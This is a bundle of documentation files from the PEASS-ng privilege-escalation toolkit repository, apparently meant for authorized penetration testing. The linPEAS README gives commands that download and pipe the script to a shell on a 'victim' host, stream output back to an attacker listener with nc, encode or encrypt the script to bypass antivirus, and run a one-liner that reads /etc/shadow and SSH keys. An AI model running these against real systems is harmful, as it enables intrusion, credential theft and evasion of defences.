{"source": "github", "repo": "carlospolop/PEASS-ng", "file": ".github/ISSUE_TEMPLATE.md", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/.github/ISSUE_TEMPLATE.md", "content": "If you are going to suggest something, please remove the following template. \nIf your issue is related with WinPEAS.ps1 please mention https://github.com/RandolphConley\n\n#### Issue description\n\n\n#### Steps to reproduce the issue\n\n1.  \n2. \n3.\n\n#### Which parameters did you use for executing the script and how did you execute it?\n\n\n#### If winpeas, did you use a clean or obfuscated winpeas, and for which architecture?\n\n\n#### Is there any AV / Threat protection in the system?\n\n\n#### Please, indicate the OS, the OS version, and the kernel version (build number in case of Windows)\n\n\n#### Please, indicate the check that is failing and add a screenshot showing the problem\n\n\n#### How did you expect it to work?\n\n\n#### Additional details / screenshot\n\n", "timestamp": "2025-10-21T21:59:13.195429"}
{"source": "github", "repo": "carlospolop/PEASS-ng", "file": "CONTRIBUTING.md", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/CONTRIBUTING.md", "content": "# Contributing to this repository\n\n## Making Suggestions \nIf you want to make a suggestion for linpeas or winpeas please use **[github issues](https://github.com/peass-ng/PEASS-ng/issues)**\n\n## Do don't know how to help?\nCheck out the **[TODO](https://github.com/peass-ng/PEASS-ng/blob/master/TODO.md) page**\n\n## Searching for files with sensitive information\nFrom the PEASS-ng release **winpeas and linpeas are auto-built** and will search for files containing sensitive information specified in the **[sesitive_files.yaml](https://github.com/peass-ng/PEASS-ng/blob/master/build_lists/sensitive_files.yaml)** file.\n\nIf you want to **contribute adding the search of new files that can contain sensitive information**, please, just update **[sesitive_files.yaml](https://github.com/peass-ng/PEASS-ng/blob/master/build_lists/sensitive_files.yaml)** and create a **PR to master** (*linpeas and winpeas will be auto-built in this PR*). You can find examples of how to contribute to this file inside the file.\nAlso, in the comments of this PR, put links to pages where and example of the file containing sensitive information can be foud.\n\n## Specific LinPEAS additions\nFrom the PEASS-ng release **linpeas is auto-build from [linpeas/builder](https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/builder/)**. Therefore, if you want to contribute adding any new check for linpeas/macpeas, please **add it in this directory and create a PR to master**. *Note that some code is auto-generated in the python but most of it it's just written in different files that will be merged into linpeas.sh*.\nThe new linpeas.sh script will be auto-generated in the PR.\n\n## Specific WinPEAS additions\nJust modify winpeas and create a PR to master.\nThe new winpeas binaries will be auto-generated in the PR.\n", "timestamp": "2025-10-21T21:59:14.110838"}
{"source": "github", "repo": "carlospolop/PEASS-ng", "file": "README.md", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/README.md", "content": "# PEASS-ng - Privilege Escalation Awesome Scripts SUITE new generation\n\n![](https://github.com/peass-ng/PEASS-ng/raw/master/linPEAS/images/peass.png)\n\n![](https://img.shields.io/badge/Black-Arch-black) ![](https://img.shields.io/badge/Arch-AUR-brightgreen) ![](https://img.shields.io/badge/Black%20Hat%20Arsenal-Asia%202020-red)\n\n# Basic Tutorial\n[![Tutorial](https://img.youtube.com/vi/2Ey1WQXNp3w/0.jpg)](https://www.youtube.com/watch?v=9_fJv_weLU0&list=PL9fPq3eQfaaDxjpXaDYApfVA_IB8T14w7)\n\n\nHere you will find **privilege escalation tools for Windows and Linux/Unix\\* and MacOS**.\n\nThese tools search for possible **local privilege escalation paths** that you could exploit and print them to you **with nice colors** so you can recognize the misconfigurations easily.\n\n- Check the **Local Windows Privilege Escalation checklist** from **[book.hacktricks.wiki](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)**\n- **[WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) - Windows local Privilege Escalation Awesome Script (C#.exe and .bat)**\n\n- Check the **Local Linux Privilege Escalation checklist** from **[book.hacktricks.wiki](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html)**\n- **[LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) - Linux local Privilege Escalation Awesome Script (.sh)**\n\n## Quick Start\nFind the **latest versions of all the scripts and binaries in [the releases page](https://github.com/peass-ng/PEASS-ng/releases/latest)**.\n\n## JSON, HTML & PDF output\nCheck the **[parsers](./parsers/)** directory to **transform PEASS outputs to JSON, HTML and PDF**\n\n## Join us!\n\nIf you are a **PEASS & Hacktricks enthusiast**, you can get your hands now on **our [custom swag](https://peass.creator-spring.com/) and show how much you like our projects!**\n\nYou can also, join the üí¨ [Discord group](https://discord.gg/hRep4RUj7f) or the [telegram group](https://t.me/peass) to learn about latest news in cybersecurity and meet other cybersecurity enthusiasts, or follow me on Twitter üê¶ [@hacktricks_live](https://twitter.com/hacktricks_live).\n\n## Let's improve PEASS together\n\nIf you want to **add something** and have **any cool idea** related to this project, please let me know it in the **telegram group https://t.me/peass** or contribute reading the **[CONTRIBUTING.md](https://github.com/peass-ng/PEASS-ng/blob/master/CONTRIBUTING.md)** file.\n\n## Advisory\n\nAll the scripts/binaries of the PEAS suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own machines and/or with the owner's permission.\n\n", "timestamp": "2025-10-21T21:59:14.815904"}
{"source": "github", "repo": "carlospolop/PEASS-ng", "file": "TODO.md", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/TODO.md", "content": "# TODO\n\n### Generate Nice Reports\n- [x] Create a parser from linpeas and winpeas.exe output to JSON. You can fin it [here](https://github.com/peass-ng/PEASS-ng/tree/master/parser).\n- [ ] Create a python script that generates a nice HTML/PDF from the JSON output\n\n### Generate a DB of Known Vulnerable Binaries\n- [ ] Create a DB of the md5/sha1 of binaries known to be vulnerable to command execution/Privilege Escalation\n\n### Maintain Updated LinPEAS's known SUID exploits \n- [ ] Maintain updated LinPEAS's known SUID exploits \n\n### Network Capabilities for WinPEAS\n- [ ] Give to WinPEAS network host discover capabilities and port scanner capabilities (like LinPEAS has)\n\n### Add More checks to LinPEAS and WinPEAS\n- [ ] Add more checks in LinPEAS\n- [ ] Add more checks in WinPEAS\n\n### Find a way to minify and/or obfuscate LinPEAS automatically\n- [ ] Find a way to minify and/or obfuscate linpeas.sh automatically. If you know a way contact me in Telegram or via github issues\n\n### Create a PEASS-ng Web Page were the project is properly presented\n- [ ] Let me know in Telegram or github issues if you are interested in helping with this\n\n### Relate LinPEAS and WinPEAS with the Att&ck matrix\n- [ ] In the title of each check of LinPEAS and WinPEAS indicate between parenthesis and in grey the Tactic used. Example: **Enumerating something** (*T1234*)\n- [ ] Once the previous task is done, modify LinPEAS and WinPEAS to be able to indicate just the Tactic(s) that want to be executed so the scripts only execute the checks related to those tactics. Example: `linpeas.sh -T T1590,T1591`\n", "timestamp": "2025-10-21T21:59:15.228397"}
{"source": "github", "repo": "carlospolop/PEASS-ng", "file": "linPEAS/README.md", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md", "content": "# LinPEAS - Linux Privilege Escalation Awesome Script\n\n![](https://github.com/peass-ng/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/linpeas.png)\n\n**LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix\\*/MacOS hosts. The checks are explained on [book.hacktricks.wiki](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)**\n\nCheck the **Local Linux Privilege Escalation checklist** from **[book.hacktricks.wiki](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html)**.\n\n[![asciicast](https://asciinema.org/a/250532.png)](https://asciinema.org/a/309566)\n\n## MacPEAS\n\nJust execute `linpeas.sh` in a MacOS system and the **MacPEAS version will be automatically executed**\n\n## Build your own linpeas!\n\nThe latest version of linpeas allows you to **select the checks you would like your linpeas to have** and built it only with those checks!\n\nThis allows to create **smaller and faster linpeas scripts** for stealth and speed purposes.\n\nCheck how to **select the checks you want to build [in your own linpeas following this link.](builder)**\n\nNote that by default, in the releases pages of this repository, you will find a **linpeas with all the checks**.\n\n## Differences between `linpeas_fat.sh`, `linpeas.sh` and `linpeas_small.sh`:\n\n- **linpeas_fat.sh**: Contains all checks, even third party applications in base64 embedded.\n- **linpeas.sh**: Contains all checks, but only the third party application `linux exploit suggester` is embedded. This is the default `linpeas.sh`.\n- **linpeas_small.sh**: Contains only the most *important* checks making its size smaller.\n\n## Quick Start\nFind the **latest versions of all the scripts and binaries in [the releases page](https://github.com/peass-ng/PEASS-ng/releases/latest)**.\n\n```bash\n# From public github\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n```\n\n```bash\n# Local network\nsudo python3 -m http.server 80 #Host\ncurl 10.10.10.10/linpeas.sh | sh #Victim\n\n# Without curl\nsudo nc -q 5 -lvnp 80 < linpeas.sh #Host\ncat < /dev/tcp/10.10.10.10/80 | sh #Victim\n\n# Excute from memory and send output back to the host\nnc -lvnp 9002 | tee linpeas.out #Host\ncurl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim\n```\n\n```bash\n# Output to file\n./linpeas.sh -a > /dev/shm/linpeas.txt #Victim\nless -r /dev/shm/linpeas.txt #Read with colors\n```\n\n```bash\n# Use a linpeas binary\nwget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64\nchmod +x linpeas_linux_amd64\n./linpeas_linux_amd64\n```\n\n## AV bypass\n```bash\n#open-ssl encryption\nopenssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc\nsudo python -m SimpleHTTPServer 80 #Start HTTP server\ncurl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim\n\n#Base64 encoded\nbase64 -w0 linpeas.sh > lp.enc\nsudo python -m SimpleHTTPServer 80 #Start HTTP server\ncurl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim\n```\n\n## Firmware Analysis\nIf you have a **firmware** and you want to **analyze it with linpeas** to **search for passwords or bad configured permissions** you have 2 main options.\n\n- If you **can emulate** the firmware, just run linpeas inside of it:\n```bash\ncp /path/to/linpeas.sh /mnt/linpeas.sh\nchroot /mnt #Supposing you have mounted the firmware FS in /mnt\nbash /linpeas.sh -o software_information,interesting_files,api_keys_regex\n```\n\n- If you **cannot emulate** the firmware, use the `-f </path/to/folder` param:\n```bash\n# Point to the folder containing the files you want to analyze\nbash /path/to/linpeas.sh -f /path/to/folder\n```\n\n## Basic Information\n\nThe goal of this script is to search for possible **Privilege Escalation Paths** (tested in Debian, CentOS, FreeBSD, OpenBSD and MacOS).\n\nThis script doesn't have any dependency.\n\nIt uses **/bin/sh** syntax, so can run in anything supporting `sh` (and the binaries and parameters used).\n\nBy default, **linpeas won't write anything to disk and won't try to login as any other user using `su`**.\n\nBy default linpeas takes around **4 mins** to complete, but It could take from **5 to 10 minutes** to execute all the checks using **-a** parameter *(Recommended option for CTFs)*:\n- From less than 1 min to 2 mins to make almost all the checks\n- Almost 1 min to search for possible passwords inside all the accesible files of the system\n- 20s/user bruteforce with top2000 passwords *(need `-a`)* - Notice that this check is **super noisy**\n- 1 min to monitor the processes in order to find very frequent cron jobs *(need `-a`)* - Notice that this check will need to **write** some info inside a file that will be deleted\n\n**Interesting parameters:**\n- **-a** (all checks except regex) - This will **execute also the check of processes during 1 min, will search more possible hashes inside files, and brute-force each user using `su` with the top2000 passwords.**\n- **-e** (extra enumeration) - This will execute **enumeration checkes that are avoided by default**\n- **-r** (regex checks) - This will search for **hundreds of API keys of different platforms in the Filesystem**\n- **-s** (superfast & stealth) - This will bypass some time consuming checks - **Stealth mode** (Nothing will be written to disk)\n- **-P** (Password) - Pass a password that will be used with `sudo -l` and bruteforcing other users\n- **-D** (Debug) - Print information about the checks that haven't discovered anything and about the time each check took\n- **-d/-p/-i/-t** (Local Network Enumeration) - Linpeas can also discover and port-scan local networks\n\n**It's recommended to use the params `-a` and `-r` if you are looking for a complete and intensive scan**.\n\n```\nEnumerate and search Privilege Escalation vectors.\nThis tool enum and search possible misconfigurations (known vulns, user, processes and file permissions, special file permissions, readable/writable files, bruteforce other users(top1000pwds), passwords...) inside the host and highlight possible misconfigurations with colors.\n        Checks:\n            -o Only execute selected checks (system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_files,api_keys_regex). Select a comma separated list.\n            -s Stealth & faster (don't check some time consuming checks)\n            -e Perform extra enumeration\n            -t Automatic network scan & Internet conectivity checks - This option writes to files\n            -r Enable Regexes (this can take from some mins to hours)\n            -P Indicate a password that will be used to run 'sudo -l' and to bruteforce other users accounts via 'su'\n\t      -D Debug mode\n\n        Network recon:\n            -t Automatic network scan & Internet conectivity checks - This option writes to files\n\t      -d <IP/NETMASK> Discover hosts using fping or ping. Ex: -d 192.168.0.1/24\n            -p <PORT(s)> -d <IP/NETMASK> Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports. Ex: -d 192.168.0.1/24 -p 53,139\n            -i <IP> [-p <PORT(s)>] Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead. Ex: -i 127.0.0.1 -p 53,80,443,8000,8080\n             Notice that if you specify some network scan (options -d/-p/-i but NOT -t), no PE check will be performed\n\n        Port forwarding:\n            -F LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT Execute linpeas to forward a port from a local IP to a remote IP\n\n        Firmware recon:\n            -f </FOLDER/PATH> Execute linpeas to search passwords/file permissions misconfigs inside a folder\n\n        Misc:\n            -h To show this message\n\t      -w Wait execution between big blocks of checks\n            -L Force linpeas execution\n            -M Force macpeas execution\n\t      -q Do not show banner\n            -N Do not use colours\n\n```\n\n## Hosts Discovery and Port Scanning\n\nWith LinPEAS you can also **discover hosts automatically** using `fping`, `ping` and/or `nc`, and **scan ports** using `nc`.\n\nLinPEAS will **automatically search for this binaries** in `$PATH` and let you know if any of them is available. In that case you can use LinPEAS to hosts dicovery and/or port scanning.\n\n![](https://github.com/peass-ng/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/network.png)\n\n\n## Colors\nLinPEAS uses colors to indicate where does each section begin. But **it also uses them the identify potencial misconfigurations**.\n\n- The ![](https://placehold.it/15/b32400/000000?text=+) **Red/Yellow** ![](https://placehold.it/15/fff500/000000?text=+) color is used for identifing configurations that lead to PE (99% sure).\n\n- The ![](https://placehold.it/15/b32400/000000?text=+) **Red** color is used for identifing suspicious configurations that could lead to privilege escalation.\n\n- The ![](https://placehold.it/15/66ff33/000000?text=+) **Green** color is used for known good configurations (based on the name not on the content!)\n\n- The ![](https://placehold.it/15/0066ff/000000?text=+) **Blue** color is used for: Users without shell & Mounted devices\n\n- The ![](https://placehold.it/15/33ccff/000000?text=+) **Light Cyan** color is used for: Users with shell\n\n- The ![](https://placehold.it/15/bf80ff/000000?text=+) **Light Magenta** color is used for: Current username\n\n</details>\n\n## One-liner Enumerator\n\nHere you have an old linpe version script in one line, **just copy and paste it**;)\n\n**The color filtering is not available in the one-liner** (the lists are too big)\n\nThis one-liner is deprecated (I'm not going to update it any more), but it could be useful in some cases so it will remain here.\n\nThe default file where all the data is stored is: */tmp/linPE* (you can change it at the beginning of the script)\n\n\n```sh\nfile=\"/tmp/linPE\";RED='\\033[0;31m';Y='\\033[0;33m';B='\\033[0;34m';NC='\\033[0m';rm -rf $file;echo \"File: $file\";echo \"[+]Gathering system information...\";printf $B\"[*] \"$RED\"BASIC SYSTEM INFO\\n\"$NC >> $file ;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Operative system\\n\"$NC >> $file;(cat /proc/version || uname -a ) 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"PATH\\n\"$NC >> $file;echo $PATH 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Date\\n\"$NC >> $file;date 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Sudo version\\n\"$NC >> $file;sudo -V 2>/dev/null| grep \"Sudo ver\" >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"selinux enabled?\\n\"$NC >> $file;sestatus 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Useful software?\\n\"$NC >> $file;which nc ncat netcat wget curl ping gcc make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Capabilities\\n\"$NC >> $file;getcap -r / 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Environment\\n\"$NC >> $file;(set || env) 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Top and cleaned proccesses\\n\"$NC >> $file;ps aux 2>/dev/null | grep -v \"\\[\" >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Binary processes permissions\\n\"$NC >> $file;ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Services\\n\"$NC >> $file;(/usr/sbin/service --status-all || /sbin/chkconfig --list || /bin/rc-status) 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Different processes executed during 1 min (HTB)\\n\"$NC >> $file;if [ \"`ps -e --format cmd`\" ]; then for i in {1..121}; do ps -e --format cmd >> $file.tmp1; sleep 0.5; done; sort $file.tmp1 | uniq | grep -v \"\\[\" | sed '/^.\\{500\\}./d' >> $file; rm $file.tmp1; fi;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Proccesses binary permissions\\n\"$NC >> $file;ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Scheduled tasks\\n\"$NC >> $file;crontab -l 2>/dev/null >> $file;ls -al /etc/cron* 2>/dev/null >> $file;cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root /var/spool/anacron 2>/dev/null | grep -v \"^#\" >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Any sd* disk in /dev?\\n\"$NC >> $file;ls /dev 2>/dev/null | grep -i \"sd\" >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Storage information\\n\"$NC >> $file;df -h 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Unmounted file-system?\\n\"$NC >> $file;cat /etc/fstab 2>/dev/null | grep -v \"^#\" >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Printer?\\n\"$NC >> $file;lpstat -a 2>/dev/null >> $file;echo \"\" >> $file;echo \"\" >> $file;echo \"[+]Gathering network information...\";printf $B\"[*] \"$RED\"NETWORK INFO\\n\"$NC >> $file ;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Hostname, hosts and DNS\\n\"$NC >> $file;cat /etc/hostname /etc/hosts /etc/resolv.conf 2>/dev/null | grep -v \"^#\" >> $file;dnsdomainname 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Networks and neightbours\\n\"$NC >> $file;cat /etc/networks 2>/dev/null >> $file;(ifconfig || ip a) 2>/dev/null >> $file;iptables -L 2>/dev/null >> $file;ip n 2>/dev/null >> $file;route -n 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Ports\\n\"$NC >> $file;(netstat -punta || ss -t; ss -u) 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Can I sniff with tcpdump?\\n\"$NC >> $file;timeout 1 tcpdump >> $file 2>&1;echo \"\" >> $file;echo \"\" >> $file;echo \"[+]Gathering users information...\";printf $B\"[*] \"$RED\"USERS INFO\\n\"$NC >> $file ;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Me\\n\"$NC >> $file;(id || (whoami && groups)) 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Sudo -l without password\\n\"$NC >> $file;echo '' | sudo -S -l -k 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Do I have PGP keys?\\n\"$NC >> $file;gpg --list-keys 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Superusers\\n\"$NC >> $file;awk -F: '($3 == \"0\") {print}' /etc/passwd 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Login\\n\"$NC >> $file;w 2>/dev/null >> $file;last 2>/dev/null | tail >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Users with console\\n\"$NC >> $file;cat /etc/passwd 2>/dev/null | grep \"sh$\" >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"All users\\n\"$NC >> $file;cat /etc/passwd 2>/dev/null | cut -d: -f1 >> $file;echo \"\" >> $file;echo \"\" >> $file;echo \"[+]Gathering files information...\";printf $B\"[*] \"$RED\"INTERESTING FILES\\n\"$NC >> $file ;echo \"\" >> $file;printf $Y\"[+] \"$RED\"SUID\\n\"$NC >> $file;find / -perm -4000 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"SGID\\n\"$NC >> $file;find / -perm -g=s -type f 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Files inside \\$HOME (limit 20)\\n\"$NC >> $file;ls -la $HOME 2>/dev/null | head -n 20 >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"20 First files of /home\\n\"$NC >> $file;find /home -type f 2>/dev/null | column -t | grep -v -i \"/\"$USER | head -n 20 >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Files inside .ssh directory?\\n\"$NC >> $file;find  /home /root -name .ssh 2>/dev/null -exec ls -laR {} \\; >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"*sa_key* files\\n\"$NC >> $file;find / -type f -name \"*sa_key*\" -ls 2>/dev/null -exec ls -l {} \\; >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Mails?\\n\"$NC >> $file;ls -alh /var/mail/ /var/spool/mail/ 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"NFS exports?\\n\"$NC >> $file;cat /etc/exports 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Hashes inside /etc/passwd? Readable /etc/shadow or /etc/master.passwd?\\n\"$NC >> $file;grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null >> $file;cat /etc/shadow /etc/master.passwd 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Readable /root?\\n\"$NC >> $file;ls -ahl /root/ 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Inside docker or lxc?\\n\"$NC >> $file;dockercontainer=`grep -i docker /proc/self/cgroup  2>/dev/null; find / -name \"*dockerenv*\" -exec ls -la {} \\; 2>/dev/null`;lxccontainer=`grep -qa container=lxc /proc/1/environ 2>/dev/null`;if [ \"$dockercontainer\" ]; then echo \"Looks like we're in a Docker container\" >> $file; fi;if [ \"$lxccontainer\" ]; then echo \"Looks like we're in a LXC container\" >> $file; fi;echo \"\" >> $file;printf $Y\"[+] \"$RED\"*_history, profile, bashrc, httpd.conf\\n\"$NC >> $file;find / -type f \\( -name \"*_history\" -o -name \"profile\" -o -name \"*bashrc\" -o -name \"httpd.conf\" \\) -exec ls -l {} \\; 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"All hidden files (not in /sys/) (limit 100)\\n\"$NC >> $file;find / -type f -iname \".*\" -ls 2>/dev/null | grep -v \"/sys/\" | head -n 100 >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"What inside /tmp, /var/tmp, /var/backups\\n\"$NC >> $file;ls -a /tmp /var/tmp /var/backups 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Interesting writable Files\\n\"$NC >> $file;USER=`whoami`;HOME=/home/$USER;find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | grep -v '/sys/fs'| sort | uniq >> $file;for g in `groups`; do find / \\( -type f -or -type d \\) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME | grep -v '/sys/fs'; done >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Web files?(output limited)\\n\"$NC >> $file;ls -alhR /var/www/ 2>/dev/null | head >> $file;ls -alhR /srv/www/htdocs/ 2>/dev/null | head >> $file;ls -alhR /usr/local/www/apache22/data/ 2>/dev/null | head >> $file;ls -alhR /opt/lampp/htdocs/ 2>/dev/null | head >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Backup files?\\n\"$NC >> $file;find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \\( -name \"*back*\" -o -name \"*bck*\" \\) 2>/dev/null >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Find IPs inside logs\\n\"$NC >> $file;grep -a -R -o '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}' /var/log/ 2>/dev/null | sort | uniq >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Find 'password' or 'passw' string inside /home, /var/www, /var/log, /etc\\n\"$NC >> $file;grep -lRi \"password\\|passw\" /home /var/www /var/log 2>/dev/null | sort | uniq >> $file;echo \"\" >> $file;printf $Y\"[+] \"$RED\"Sudo -l (you need to puts the password and the result appear in console)\\n\"$NC >> $file;sudo -l;\n```\n\n## PEASS Style\n\nAre you a PEASS fan? Get now our merch at **[PEASS Shop](https://teespring.com/stores/peass)** and show your love for our favorite peas\n\n## Collaborate\n\nIf you want to help with the TODO tasks or with anything, you can do it using **[github issues](https://github.com/peass-ng/privilege-escalation-awesome-scripts-suite/issues) or you can submit a pull request**.\n\nIf you find any issue, please report it using **[github issues](https://github.com/peass-ng/privilege-escalation-awesome-scripts-suite/issues)**.\n\n**Linpeas** is being **updated** every time I find something that could be useful to escalate privileges.\n\n## Advisory\n\nAll the scripts/binaries of the PEAS Suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.\n", "timestamp": "2025-10-21T21:59:16.421926"}
{"source": "github", "repo": "carlospolop/PEASS-ng", "file": "linPEAS/TODO.md", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/TODO.md", "content": "- Add more checks\n- Add more potential files with passwords to sensitive_files.yaml\n- Add more regex of interesting APIs to regexes.yaml\n- Mantain updated the list of vulnerable SUID binaries\n- Mantain updated all the blacklists used to color the output\n- Improve the speed\n- Reduce the size of the script\n- Generate automatically an obfuscated version", "timestamp": "2025-10-21T21:59:16.535377"}
{"source": "github", "repo": "carlospolop/PEASS-ng", "file": "linPEAS/builder/README.md", "url": "https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/builder/README.md", "content": "# Build you own linpeas!\n\nYou can **build you own linpeas which will contain only the checks you want**. This is useful to reduce the time it takes to run linpeas and to make linpeas more stealth and modular.\n\n## Quick start building linpeas.sh\n\nIt's possible to indicate the params `--all`, `--all-no-fat` and `--small` to build the classic `linpeas_fat.sh`, `linpeas.sh` and `linpeas_small.sh`:\n\n- **linpeas_fat.sh**: Contains all checks, even third party applications in base64 embedded.\n- **linpeas.sh**: Contains all checks, but only the third party application `linux exploit suggester` is embedded. This is the default `linpeas.sh`.\n- **linpeas_small.sh**: Contains only the most *important* checks making its size smaller.\n\nHowever, in order to indicate only some specific checks, you can use the `--include` and `--exclude` params. These arguments supports a comma separated list of modules to add or remove from the final linpeas. Note that the matchs are done by checking **if the module path string contains any of the words** indicated in those params. Therefore, if you want to inde all the tests from the `linpeas_parts/3_cloud` it's enough to indicate `--include \"cloud\"`. Or if you want to include only the check `linpeas_parts/3_cloud/1_Check_if_in_Cloud` you can indicate `--include \"Check_if_in_Cloud\"`.\n\n```bash\n# Run this commands from 1 level above the builder folder. From here: cd ..\n# Build linpeas_fat (linpeas with all checks, even third party applications in base64 embedded)\npython3 -m builder.linpeas_builder --all --output /tmp/linpeas_fat.sh\n\n# Build regular linpeas\npython3 -m builder.linpeas_builder --all-no-fat --output /tmp/linpeas.sh\n\n# Build small linpeas\npython3 -m builder.linpeas_builder --small --output /tmp/linpeas_small.sh\n\n# Build linpeas only with container and cloud checks\npython3 -m builder.linpeas_builder --include \"container,cloud\" --output /tmp/linpeas_custom.sh\n\n# Build linpeas only with regexes\npython3 -m builder.linpeas_builder --include \"api_keys_regex\" --output /tmp/linpeas_custom.sh\n\n# Build linpeas only with some specific modules\n## You can customize it as much as you want\npython3 -m builder.linpeas_builder --include \"CPU_info,Sudo_version,Clipboard_highlighted_text\" --output /tmp/linpeas_custom.sh\n\n# Build linpeas excluding some specific modules\npython3 -m builder.linpeas_builder --exclude \"CPU_info,Sudo_version,Clipboard_highlighted_text\" --output /tmp/linpeas_custom.sh\n```\n\n## How to add new modules\n\nAdding new modules is very easy. You just need to create a new file in the `linpeas_parts/<corresponding section>` folder with the following structure with the bash code to run. Note that every new module should have some specific metadata at the beggining of the file. This metadata is used by the builder to generate the final linpeas.\n\nMetadata example:\n\n```bash\n# Title: Cloud - Check if in cloud\n# ID: CL_Check_if_in_cloud\n# Author: Carlos Polop\n# Last Update: 22-08-2023\n# Description: Check if the current system is inside a cloud environment\n# License: GNU GPL\n# Version: 1.0\n# Functions Used: check_aws_codebuild, check_aws_ec2, check_aws_ecs, check_aws_lambda, check_az_app, 